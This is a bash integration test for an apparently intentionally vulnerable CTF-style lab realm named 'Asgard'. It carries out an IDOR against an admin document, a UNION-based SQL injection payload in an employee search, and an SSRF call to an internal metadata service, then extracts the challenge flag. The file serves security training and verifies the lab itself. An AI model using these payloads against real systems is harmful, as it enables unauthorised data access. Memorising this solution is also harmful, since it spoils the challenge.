#!/bin/bash
# Integration test for Asgard - Chained IDOR → SQLi → SSRF
set -e
REALM="asgard"
BASE_URL="http://localhost:8080/realms/${REALM}"
echo "========================================"
echo "Testing ASGARD Realm"
echo "A01:2025 - Broken Access Control + SSRF"
echo "Chained: IDOR → SQLi → SSRF"
echo "========================================"
echo ""
echo "Step 1: Health check..."
curl -s "${BASE_URL}/health" | grep -q '"status":"ok"' && echo "✓ Health OK" || exit 1
echo "Step 2: IDOR - Access admin document (ID 21)..."
DOC=$(curl -s "${BASE_URL}/api/documents/21")
echo "$DOC" | grep -q '"title":"System Architecture Overview"' && echo "✓ Admin document accessed (IDOR)" || exit 1
echo "  Content mentions: localhost:9090/metadata/secrets"
echo "Step 3: SQLi - Search employees with injection..."
SQLI_RESULT=$(curl -s -X POST "${BASE_URL}/api/employees/search" \
  -H "Content-Type: application/json" \
  -d '{"query":"'"'"' UNION SELECT id, username, department, role, email, created_at FROM employees--"}')
echo "$SQLI_RESULT" | grep -q '"username"' && echo "✓ SQL injection successful" || exit 1
echo "Step 4: SSRF - Access internal metadata service..."
SSRF_RESULT=$(curl -s -X POST "${BASE_URL}/api/odin-view" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:9090/metadata/secrets"}')
FLAG=$(echo "$SSRF_RESULT" | grep -oP 'YGGDRASIL\{ASGARD:[a-f0-9-]+\}' | head -1)
if [ -z "$FLAG" ]; then echo "✗ Flag not found"; exit 1; fi
echo "✓ Flag extracted via SSRF: $FLAG"
echo "Step 5: Validate flag format..."
echo "$FLAG" | grep -qP '^YGGDRASIL\{ASGARD:[a-f0-9-]+\}$' && echo "✓ Flag format valid" || exit 1
echo ""
echo "========================================"
echo "✓ All ASGARD tests passed!"
echo "========================================"
echo "Flag: $FLAG"
echo ""
echo "Exploit Chain Summary:"
echo "  1. IDOR: Accessed admin document #21 (no owner check)"
echo "  2. Discovery: Found internal service URL in admin docs"
echo "  3. SQLi: Injected UNION query in employee search"
echo "  4. SSRF: Used Odin-View to access localhost:9090"
echo "  5. Flag: Retrieved from internal metadata service"
